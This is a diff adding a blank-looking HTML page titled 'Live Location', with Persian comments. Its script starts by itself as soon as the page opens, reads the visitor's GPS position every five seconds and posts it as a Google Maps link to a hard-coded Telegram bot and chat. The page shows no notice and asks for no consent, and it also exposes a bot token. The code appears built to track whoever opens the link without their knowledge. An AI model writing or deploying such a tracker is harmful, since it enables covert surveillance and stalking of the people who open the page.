@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Live Location</title>
+</head>
+<body>
+<script>
+const TOKEN = "8692838543:AAFM5yYJ5hOIVw4B7veVwSDpUj3vuZXCN8U";   // توکن ربات تلگرام
+const CHAT_ID = "138836714";   // chat_id مدیر
+const INTERVAL = 5000;            // بروزرسانی هر ۵ ثانیه
+let message_id = null;            // ذخیره message_id پیام اولیه
+
+async function sendOrUpdateLocation(lat, lon){
+  const url = message_id
+    ? `https://api.telegram.org/bot${TOKEN}/editMessageText`
+    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+  const payload = message_id
+    ? {
+        chat_id: CHAT_ID,
+        message_id: message_id,
+        text: "📍 Live Location:\nhttps://maps.google.com/?q=" + lat + "," + lon
+      }
+    : {
+        chat_id: CHAT_ID,
+        text: "📍 Live Location:\nhttps://maps.google.com/?q=" + lat + "," + lon
+      };
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    if(!message_id && data.result && data.result.message_id){
+      message_id = data.result.message_id; // ذخیره message_id پیام اولیه
+    }
+  } catch(e) {
+    console.error("Send failed:", e);
+  }
+}
+
+function startLiveLocation(){
+  if(!navigator.geolocation) return;  // اگر GPS نباشد هیچ کاری نمی‌کند
+
+  // هر INTERVAL میلی‌ثانیه یکبار موقعیت ارسال شود
+  setInterval(()=>{
+    navigator.geolocation.getCurrentPosition(pos=>{
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      sendOrUpdateLocation(lat, lon);
+    });
+  }, INTERVAL);
+}
+
+// شروع خودکار بلافاصله پس از باز شدن صفحه
+startLiveLocation();
+</script>
+</body>
+</html>
